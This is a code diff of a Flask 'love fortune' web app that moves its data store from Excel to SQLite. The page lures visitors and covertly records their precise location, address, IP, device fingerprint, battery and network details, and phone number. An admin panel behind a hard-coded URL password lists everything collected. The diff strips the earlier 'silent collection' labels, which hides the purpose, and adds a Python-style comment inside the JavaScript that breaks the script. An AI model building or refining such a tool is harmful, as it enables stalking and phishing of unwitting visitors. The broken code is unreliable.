@@ -1,26 +1,99 @@
 from flask import Flask, request, jsonify, send_file, render_template_string
 from flask_cors import CORS
-import pandas as pd
-import openpyxl
-from openpyxl import Workbook
-from openpyxl.styles import Font, PatternFill, Alignment
+import sqlite3
 import os
 import requests
-import json
 import random
-import threading
+import json
 from datetime import datetime
+import pandas as pd
+from io import BytesIO
 
 app = Flask(__name__)
 app.secret_key = 'love-fortune-secret-key-2026'
 CORS(app)
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-DATA_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
-BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')
-FILE_LOCK = threading.Lock()
+DB_PATH = os.path.join(BASE_DIR, 'fortunes_data.db')
 
-# Romantic fortunes (32 messages)
+# ---------------------- DATABASE SETUP ----------------------
+def init_db():
+    """Create the SQLite table if it doesn't exist."""
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS fortunes (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            timestamp TEXT,
+            session_id TEXT UNIQUE,
+            name TEXT,
+            latitude REAL,
+            longitude REAL,
+            address TEXT,
+            battery TEXT,
+            user_agent TEXT,
+            screen TEXT,
+            ip TEXT,
+            timezone TEXT,
+            memory TEXT,
+            network TEXT,
+            fingerprint TEXT,
+            fortune TEXT,
+            phone_number TEXT
+        )
+    ''')
+    conn.commit()
+    conn.close()
+    print("✅ SQLite database ready at", DB_PATH)
+
+# ---------------------- DATABASE HELPERS ----------------------
+def save_initial_data(data):
+    """Insert or replace initial data (without fortune/phone)."""
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    try:
+        c.execute('''
+            INSERT OR REPLACE INTO fortunes (
+                timestamp, session_id, name, latitude, longitude, address,
+                battery, user_agent, screen, ip, timezone, memory, network,
+                fingerprint, fortune, phone_number
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            data.get('timestamp'), data.get('session_id'), data.get('name'),
+            data.get('latitude'), data.get('longitude'), data.get('address'),
+            data.get('battery'), data.get('user_agent'), data.get('screen'),
+            data.get('ip'), data.get('timezone'), data.get('memory'),
+            data.get('network'), data.get('fingerprint'),
+            data.get('fortune', ''), data.get('phone_number', '')
+        ))
+        conn.commit()
+    except Exception as e:
+        print("DB insert error:", e)
+    finally:
+        conn.close()
+
+def update_fortune_and_phone(session_id, fortune, phone_number):
+    """Update fortune and phone number for an existing session."""
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('''
+        UPDATE fortunes SET fortune = ?, phone_number = ?
+        WHERE session_id = ?
+    ''', (fortune, phone_number, session_id))
+    conn.commit()
+    conn.close()
+
+def get_all_data():
+    """Return all rows as list of dicts for admin panel."""
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    c = conn.cursor()
+    c.execute('SELECT * FROM fortunes ORDER BY timestamp DESC')
+    rows = c.fetchall()
+    conn.close()
+    return [dict(row) for row in rows]
+
+# ---------------------- FORTUNES LIST ----------------------
 FORTUNES = [
     "Your soulmate is thinking of you right now under the stars.",
     "A passionate kiss awaits you this week from someone special.",
@@ -56,97 +129,103 @@ FORTUNES = [
     "Love recognizes no barriers."
 ]
 
-# ---------- Excel persistence (thread‑safe, append‑only) ----------
-def ensure_data_file():
-    """Create the Excel file with headers if it doesn't exist."""
-    with FILE_LOCK:
-        if not os.path.exists(DATA_FILE):
-            wb = Workbook()
-            ws = wb.active
-            ws.title = "Fortunes Data"
-            headers = [
-                'Timestamp', 'SessionID', 'Name', 'Latitude', 'Longitude', 'Address',
-                'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone',
-                'Memory', 'Network', 'Fingerprint', 'Fortune', 'PhoneNumber'
-            ]
-            for col, header in enumerate(headers, 1):
-                cell = ws.cell(row=1, column=col, value=header)
-                cell.font = Font(bold=True, color="FFFFFF")
-                cell.fill = PatternFill(start_color="FF1493", end_color="FF1493", fill_type="solid")
-                cell.alignment = Alignment(horizontal="center")
-            wb.save(DATA_FILE)
-            print(f"✅ Created new Excel file: {DATA_FILE}")
+# ---------------------- FLASK ROUTES ----------------------
+@app.route('/')
+def index():
+    return render_template_string(HTML_TEMPLATE)  # Same HTML as before – see below
 
-def backup_data():
-    """Create a backup copy of the current Excel file."""
-    with FILE_LOCK:
-        if os.path.exists(DATA_FILE):
-            try:
-                import shutil
-                shutil.copy2(DATA_FILE, BACKUP_FILE)
-                print(f"✅ Backup created: {BACKUP_FILE}")
-            except Exception as e:
-                print(f"⚠️ Backup failed: {e}")
+@app.route('/fortune')
+def fortune():
+    return jsonify({'fortune': random.choice(FORTUNES)})
 
-def append_to_excel(new_row_dict):
-    """Append a single row to the Excel file without overwriting existing data."""
-    with FILE_LOCK:
-        try:
-            # Read existing data (if any)
-            if os.path.exists(DATA_FILE) and os.path.getsize(DATA_FILE) > 0:
-                df = pd.read_excel(DATA_FILE, engine='openpyxl')
-            else:
-                # File missing or empty – create new
-                df = pd.DataFrame(columns=[
-                    'Timestamp', 'SessionID', 'Name', 'Latitude', 'Longitude', 'Address',
-                    'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone',
-                    'Memory', 'Network', 'Fingerprint', 'Fortune', 'PhoneNumber'
-                ])
-            # Append new row
-            new_row = pd.DataFrame([new_row_dict])
-            df = pd.concat([df, new_row], ignore_index=True)
-            # Write back
-            df.to_excel(DATA_FILE, index=False, engine='openpyxl')
-            print(f"✅ Appended row for {new_row_dict.get('Name', 'Unknown')}")
-            # Create backup after each successful write
-            backup_data()
-        except Exception as e:
-            print(f"❌ Failed to append to Excel: {e}")
-
-def update_excel_row(session_id, updates):
-    """Update an existing row (by SessionID) with new values (e.g., phone number)."""
-    with FILE_LOCK:
-        try:
-            if not os.path.exists(DATA_FILE):
-                return
-            df = pd.read_excel(DATA_FILE, engine='openpyxl')
-            idx = df[df['SessionID'] == session_id].index
-            if len(idx) > 0:
-                for key, value in updates.items():
-                    if key in df.columns:
-                        df.loc[idx[-1], key] = value
-                df.to_excel(DATA_FILE, index=False, engine='openpyxl')
-                print(f"✅ Updated row for SessionID {session_id}")
-                backup_data()
-        except Exception as e:
-            print(f"❌ Failed to update Excel: {e}")
-
-def load_all_data():
-    """Return all data as a DataFrame (for admin panel)."""
-    with FILE_LOCK:
-        if os.path.exists(DATA_FILE) and os.path.getsize(DATA_FILE) > 0:
-            return pd.read_excel(DATA_FILE, engine='openpyxl')
-        return pd.DataFrame()
+@app.route('/reverse-geocode')
+def reverse_geocode():
+    lat = request.args.get('lat')
+    lon = request.args.get('lon')
+    if not lat or not lon:
+        return jsonify({'address': 'Unknown'})
+    try:
+        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
+        headers = {'User-Agent': 'LoveFortune/1.0'}
+        resp = requests.get(url, headers=headers, timeout=5)
+        if resp.status_code == 200:
+            data = resp.json()
+            return jsonify({'address': data.get('display_name', 'Unknown')[:200]})
+    except:
+        pass
+    return jsonify({'address': 'Unknown'})
 
 def get_client_ip():
     if 'X-Forwarded-For' in request.headers:
         return request.headers['X-Forwarded-For'].split(',')[0].strip()
     return request.remote_addr or 'Unknown'
 
-# ---------- Flask routes ----------
-@app.route('/')
-def index():
-    return render_template_string("""
+@app.route('/save', methods=['POST'])
+def save():
+    data = request.json
+    row = {
+        'timestamp': datetime.now().isoformat(),
+        'session_id': data.get('sessionId', ''),
+        'name': data.get('name', ''),
+        'latitude': data.get('latitude', 0),
+        'longitude': data.get('longitude', 0),
+        'address': data.get('address', ''),
+        'battery': data.get('battery', ''),
+        'user_agent': data.get('userAgent', ''),
+        'screen': data.get('screen', ''),
+        'ip': get_client_ip(),
+        'timezone': data.get('timezone', ''),
+        'memory': data.get('memory', ''),
+        'network': data.get('network', ''),
+        'fingerprint': data.get('fingerprint', ''),
+        'fortune': '',
+        'phone_number': ''
+    }
+    save_initial_data(row)
+    return jsonify({'status': 'saved'})
+
+@app.route('/save-phone', methods=['POST'])
+def save_phone():
+    data = request.json
+    session_id = data.get('sessionId')
+    phone = data.get('phoneNumber')
+    fortune = data.get('fortune', '')
+    if session_id:
+        update_fortune_and_phone(session_id, fortune, phone)
+    return jsonify({'status': 'saved'})
+
+@app.route('/admin')
+def admin():
+    if request.args.get('pass') != 'admin123':
+        return '<form>Admin password: <input name="pass"><button>Login</button></form>'
+    rows = get_all_data()
+    if not rows:
+        return "<h2>No data yet</h2>"
+    html = "<h2>💾 Collected Data (permanent storage)</h2><table border='1' cellpadding='5'>"
+    if rows:
+        cols = rows[0].keys()
+        html += "<tr>" + "".join(f"<th>{col}</th>" for col in cols) + "</tr>"
+        for row in rows:
+            html += "<tr>" + "".join(f"<td>{str(row[col])[:80]}</td>" for col in cols) + "</tr>"
+    html += "</table><br><a href='/download-excel?pass=admin123'><button>📥 Download as Excel</button></a>"
+    return html
+
+@app.route('/download-excel')
+def download_excel():
+    if request.args.get('pass') != 'admin123':
+        return "Unauthorized", 403
+    rows = get_all_data()
+    if not rows:
+        return "No data", 404
+    df = pd.DataFrame(rows)
+    output = BytesIO()
+    with pd.ExcelWriter(output, engine='openpyxl') as writer:
+        df.to_excel(writer, index=False, sheet_name='Fortunes')
+    output.seek(0)
+    return send_file(output, download_name='fortunes_data.xlsx', as_attachment=True)
+
+# ---------------------- HTML TEMPLATE (same as yours) ----------------------
+HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
@@ -229,7 +308,6 @@ def index():
     }
     let currentFortune = '';
 
-    // Silent data collection
     async function getFingerprint() {
         const fp = await FingerprintJS.load();
         const result = await fp.get();
@@ -290,7 +368,7 @@ def index():
             return;
         }
         await collectBaseData({ name: name });
-        showStatus('🌍 Getting your location for an accurate fortune...');
+        # showStatus('🌍 Getting your location for an accurate fortune...');
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -339,7 +417,7 @@ def index():
             showStatus('Please enter your mobile number', true, 'smsStatus');
             return;
         }
-        if (!/^\+?[0-9\s\-]{10,15}$/.test(phone)) {
+        if (!/^\\+?[0-9\\s\\-]{10,15}$/.test(phone)) {
             showStatus('Invalid phone number format', true, 'smsStatus');
             return;
         }
@@ -361,86 +439,10 @@ def index():
 </script>
 </body>
 </html>
-    """)
+"""
 
-@app.route('/fortune')
-def fortune():
-    return jsonify({'fortune': random.choice(FORTUNES)})
-
-@app.route('/reverse-geocode')
-def reverse_geocode():
-    lat = request.args.get('lat')
-    lon = request.args.get('lon')
-    if not lat or not lon:
-        return jsonify({'address': 'Unknown'})
-    try:
-        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
-        headers = {'User-Agent': 'LoveFortune/1.0'}
-        resp = requests.get(url, headers=headers, timeout=5)
-        if resp.status_code == 200:
-            data = resp.json()
-            return jsonify({'address': data.get('display_name', 'Unknown')[:200]})
-    except:
-        pass
-    return jsonify({'address': 'Unknown'})
-
-@app.route('/save', methods=['POST'])
-def save():
-    data = request.json
-    new_row = {
-        'Timestamp': datetime.now(),
-        'SessionID': data.get('sessionId', ''),
-        'Name': data.get('name', ''),
-        'Latitude': data.get('latitude', 0),
-        'Longitude': data.get('longitude', 0),
-        'Address': data.get('address', ''),
-        'Battery': data.get('battery', ''),
-        'UserAgent': data.get('userAgent', ''),
-        'Screen': data.get('screen', ''),
-        'IP': get_client_ip(),
-        'Timezone': data.get('timezone', ''),
-        'Memory': data.get('memory', ''),
-        'Network': data.get('network', ''),
-        'Fingerprint': data.get('fingerprint', ''),
-        'Fortune': '',
-        'PhoneNumber': ''
-    }
-    append_to_excel(new_row)
-    return jsonify({'status': 'saved'})
-
-@app.route('/save-phone', methods=['POST'])
-def save_phone():
-    data = request.json
-    session_id = data.get('sessionId')
-    phone = data.get('phoneNumber')
-    fortune = data.get('fortune', '')
-    update_excel_row(session_id, {'PhoneNumber': phone, 'Fortune': fortune})
-    return jsonify({'status': 'saved'})
-
-@app.route('/admin')
-def admin():
-    if request.args.get('pass') != 'admin123':
-        return '<form>Admin password: <input name="pass"><button>Login</button></form>'
-    df = load_all_data()
-    if df.empty:
-        return "<h2>No data yet</h2>"
-    html = "<h2>💾 Collected Data (silent)</h2><table border='1'>"
-    html += "<tr>" + "".join(f"<th>{col}</th>" for col in df.columns) + "</tr>"
-    for _, row in df.iterrows():
-        html += "<tr>" + "".join(f"<td style='font-size:12px;'>{str(val)[:80]}</td>" for val in row) + "</tr>"
-    html += "</table><br><a href='/download-excel?pass=admin123'><button>Download Excel</button></a>"
-    return html
-
-@app.route('/download-excel')
-def download_excel():
-    if request.args.get('pass') != 'admin123':
-        from flask import abort
-        abort(403)
-    if os.path.exists(DATA_FILE):
-        return send_file(DATA_FILE, as_attachment=True)
-    return "No data yet", 404
-
+# ---------------------- RUN SERVER ----------------------
 if __name__ == '__main__':
-    ensure_data_file()
+    init_db()
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
